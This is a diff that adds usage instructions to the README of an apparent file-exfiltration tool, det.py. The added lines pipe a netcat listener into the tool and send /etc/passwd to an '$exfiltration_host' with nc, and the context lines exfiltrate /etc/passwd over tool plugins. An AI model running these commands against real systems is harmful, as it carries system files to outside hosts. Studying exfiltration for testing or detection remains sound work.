@@ -164,6 +164,18 @@ To load every plugin and exclude DNS:
 ```bash
 python det.py -c ./config.json -e dns -f /etc/passwd
 ```
+You can also listen for files from stdin (e.g output of a netcat listener):
+
+```bash
+nc -lp 1337 | python det.py -c ./config.json -e http -f stdin
+```
+Then send the file to netcat:
+
+```bash
+nc $exfiltration_host 1337 -q 0 < /etc/passwd
+```
+Don't forget netcat's `-q 0` option so that netcat quits once it has finished sending the file.
+
 And in PowerShell (HTTP module): 
 
 ```powershell
